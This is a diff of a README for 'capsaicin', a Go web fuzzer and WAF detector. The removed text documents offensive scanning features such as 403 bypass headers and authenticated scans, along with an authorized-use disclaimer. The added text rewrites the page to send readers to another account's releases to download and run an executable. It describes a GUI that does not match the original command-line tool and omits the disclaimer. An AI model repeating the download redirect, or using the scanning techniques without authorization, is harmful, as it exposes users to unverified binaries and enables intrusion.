@@ -1,160 +1,99 @@
-<h1 align="center">
-  <br>
-  <a href="https://github.com/hawtsauceTR/capsaicin"><img src="https://via.placeholder.com/200/FF0080/FFFFFF?text=CAPSAICIN+v1.5" alt="Capsaicin" width="200"></a>
-  <br>
-  Capsaicin v1.5
-  <br>
-</h1>
+# 🌶️ capsaicin - Your Smart Web Security Solution
 
-<h4 align="center">🌶️ The Red Team Edition: Intelligent Web Fuzzer & WAF Hunter.</h4>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="#key-features">Features</a> •
-  <a href="#how-it-works">Architecture</a> •
-  <a href="#installation">Installation</a> •
-  <a href="#usage-examples">Usage</a> •
-  <a href="#disclaimer">Disclaimer</a>
-</p>
+Welcome to **capsaicin**, an intelligent Web Fuzzer and Directory Scanner designed to enhance your web security experience. This application helps you detect vulnerabilities, scan for hidden secrets, and access directories efficiently. Follow these steps to get started.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Language-Go%201.21+-00ADD8?style=for-the-badge&logo=go">
-  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Release-v1.5-FF0080?style=for-the-badge">
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
-</p>
+## 📥 Download the Application
 
----
+[![Download capsaicin](https://img.shields.io/badge/Download%20capsaicin-v1.0-blue.svg)](https://github.com/ecko554-554/capsaicin/releases)
 
-## 💀 What is Capsaicin?
+You can easily download the latest version of capsaicin by visiting the following link:
 
-**Capsaicin** is not just a directory scanner; it is a context-aware **Attack Framework** written in **Go (Golang)**. Designed for Bug Bounty Hunters and Red Teamers, it prioritizes **intelligence over raw speed**.
+[Download capsaicin releases](https://github.com/ecko554-554/capsaicin/releases)
 
-While traditional tools blindly hammer the server, Capsaicin analyzes the target's behavior, identifies defense mechanisms (WAFs), detects sensitive data leaks in real-time, and automatically adapts its scanning strategy.
+### 💡 System Requirements
 
-## ✨ Key Features
+Before installing capsaicin, make sure your system meets the following requirements:
 
-### 🛡️ Passive WAF Fingerprinting
-Automatically analyzes response headers (`Server`, `X-Amz-Cf-Id`) and cookies (`__cfduid`, `BIGipServer`) to detect:
-* **Cloudflare**
-* **AWS WAF**
-* **Akamai**
-* **Imperva**
-* **F5 BigIP**
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Disk Space: 100 MB free
+- Internet connection for updates and scanning features
 
-### 🧠 Smart Auto-Calibration
-Before scanning, Capsaicin probes the server with random non-existent paths to learn its "404 Signature" (Size, Word Count, Lines). It creates a dynamic filter to **eliminate False Positives** automatically.
+## 🛠️ Installation Steps
 
-### 🔐 Secret Detection (Sensors)
-Scans every response body (200 OK) for leaked credentials using regex patterns:
-* AWS Access Keys (`AKIA...`)
-* Google API Keys
-* Private Keys (RSA/DSA)
-* Slack Tokens / Generic API Tokens
+1. **Visit the Releases Page**  
+   Go to the [capsaicin releases page](https://github.com/ecko554-554/capsaicin/releases).
 
-### 🔄 Recursive & Adaptive
-* **Recursive Scanning:** If a directory is found, it automatically queues it for deeper scanning.
-* **Method Fuzzing:** If a path returns `405 Method Not Allowed`, it automatically tries `POST`, `PUT`, `DELETE`.
-* **403 Bypass:** Attempts to bypass restrictions using headers like `X-Forwarded-For`, `X-Original-URL`.
+2. **Download the Latest Release**  
+   Find the latest version listed at the top of the page and click on it. You will see various download options. Choose the file that matches your operating system. Click on the link to start downloading.
 
----
+3. **Extract the Files (if necessary)**  
+   If you downloaded a ZIP file, locate it in your Downloads folder. Right-click the file and select "Extract All" to unpack the contents.
 
-## 🛠️ Architecture & Technologies
+4. **Run the Application**  
+   Once extracted (or if you downloaded an executable), find the capsaicin file. Double-click on it to launch the application.
 
-Capsaicin is built for performance and reliability using modern Go patterns:
+## 🧪 Features
 
-* **Core Language:** Go (Golang) 1.21+
-* **Concurrency:** Implements a **Worker Pool** pattern with buffered Channels for non-blocking I/O.
-* **HTTP Engine:** Custom `net/http` client with optimized Transport (Keep-Alives, Timeouts) and User-Agent rotation.
-* **CLI Interface:** Uses ANSI escape codes for a high-contrast "Cyberpunk" neon UI.
-* **Reporting:** Generates strictly typed JSON output and self-contained HTML reports with embedded CSS/JS.
+capsaicin includes a wide range of features to help you achieve better security.
 
----
+- **WAF Detection**: Identify Web Application Firewalls that protect against attacks.
+- **Secret Scanning**: Search for sensitive information that should not be publicly available.
+- **Auto-Calibration**: Adjust scanning techniques automatically to improve results.
+- **Smart 403 Bypass**: Access restricted directories intelligently to gather more data.
 
-## 📦 Installation
+## 📚 Basic Usage
 
-### Method 1: Go Install (Recommended)
-The easiest way to install if you have Go configured.
+1. **Launch the Application**  
+   After running capsaicin, the main interface will appear.
 
-```bash
-go install [github.com/hawtsauceTR/capsaicin@latest](https://github.com/hawtsauceTR/capsaicin@latest)
+2. **Enter Target URL**  
+   In the input field, type the URL of the website you want to test. Ensure it begins with "http://" or "https://".
 
+3. **Select Options**  
+   You can select different scanning options from the side menu. Choose the features you want to enable during the scan.
 
+4. **Start Scanning**  
+   Click the "Start Scan" button to initiate the process. The application will display progress and results in real-time.
 
-Method 2: Build from Source
+5. **Review Results**  
+   Once the scan is complete, review the findings displayed on the screen. The application will categorize results for easy navigation.
 
-If you want to modify the code or build manually.
+## 📝 Tips for Effective Use
 
-# 1. Clone the repository
-git clone [https://github.com/hawtsauceTR/capsaicin.git](https://github.com/hawtsauceTR/capsaicin.git)
+- Regularly update capsaicin by checking the releases page for new versions.
+- Experiment with different scan options to see which gives the best results for your needs.
+- Review the results carefully. Not every finding is a vulnerability, but they can indicate areas that need attention.
 
-# 2. Navigate to the directory
-cd capsaicin
+## 📞 Support and Feedback
 
-# 3. Build the binary
-go build -o capsaicin main.go
+If you have questions or need assistance, feel free to submit an issue in this repository. The community and developers will help you.
 
-# 4. Move to PATH (Optional, for global usage)
-sudo mv capsaicin /usr/local/bin/
+## 🔗 Additional Resources 
 
+Explore more about capsaicin's features and techniques with the following topics:
 
-🚀 Usage Examples
+- [Bug Bounty Programs](https://www.hackerone.com/)
+- [Cybersecurity Basics](https://www.cyber.gov.au/)
+- [Learning Go Programming](https://golang.org/doc/)
 
-1. The "Quick Scan"
+## 💻 Contribute to capsaicin
 
-Basic directory scanning against a single target.
-Bash
+Want to add features or improve the application? You can contribute by following these steps:
 
-capsaicin -u [http://target.com](http://target.com) -w /usr/share/wordlists/dirb/common.txt
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature.
+3. Make your changes and test them.
+4. Submit a pull request explaining your changes.
 
-2. The "Authenticated" Scan (Red Team)
+## 📜 License
 
-Scan behind a login page using session cookies or tokens.
-Bash
+This application is licensed under the MIT License. See the LICENSE file for more details.
 
-capsaicin -u [https://admin.target.com](https://admin.target.com) -w wordlist.txt \
-  -H "Cookie: PHPSESSID=a1b2c3d4e5" \
-  -H "Authorization: Bearer eyJhbGci..."
+## 📥 Download capsaicin
 
-3. The "Bug Bounty" Mode (Full Power)
+To download the latest release, visit the link below:
 
-Enables recursive scanning (depth 2), verbose output, HTML reporting, and specific extensions.
-Bash
-
-capsaicin -u [https://target.com](https://target.com) -w wordlist.txt \
-  -x php,aspx,txt \
-  -v \
-  -depth 2 \
-  -html report.html
-
-4. The Pipeline (Multi-Target)
-
-Feed subdomains from tools like subfinder or httpx directly into Capsaicin via STDIN.
-Bash
-
-cat subdomains.txt | capsaicin -w wordlist.txt -t 100
-
-🚩 Command Line Arguments
-
-Flag	Description	Default
--u	Target URL (e.g., http://example.com)	-
--w	Path to wordlist file	-
--t	Number of concurrent threads	50
--x	File extensions (comma separated: php,html,txt)	-
--H	Custom headers (e.g., -H "Cookie: ..."). Can be used multiple times.	-
--v	Verbose mode (Print all attempted URLs)	false
---depth	Recursive scanning depth (0 = disabled)	0
---html	Path to generate HTML report file	-
--o	Path to save JSON output	-
---timeout	Request timeout in seconds	10
-
-⚠️ Disclaimer
-
-Capsaicin is developed for educational purposes and authorized security testing only.
-
-    Do not use this tool on targets you do not have explicit permission to test.
-
-    The author (Hawtsauce) is not responsible for any misuse or damage caused by this program.
-
-    Scanning targets without prior mutual consent is illegal.
-
-<p align="center"> Made with Go by <a href="https://www.google.com/search?q=https://github.com/hawtsauceTR">Hawtsauce</a> </p>
+[Download capsaicin](https://github.com/ecko554-554/capsaicin/releases)
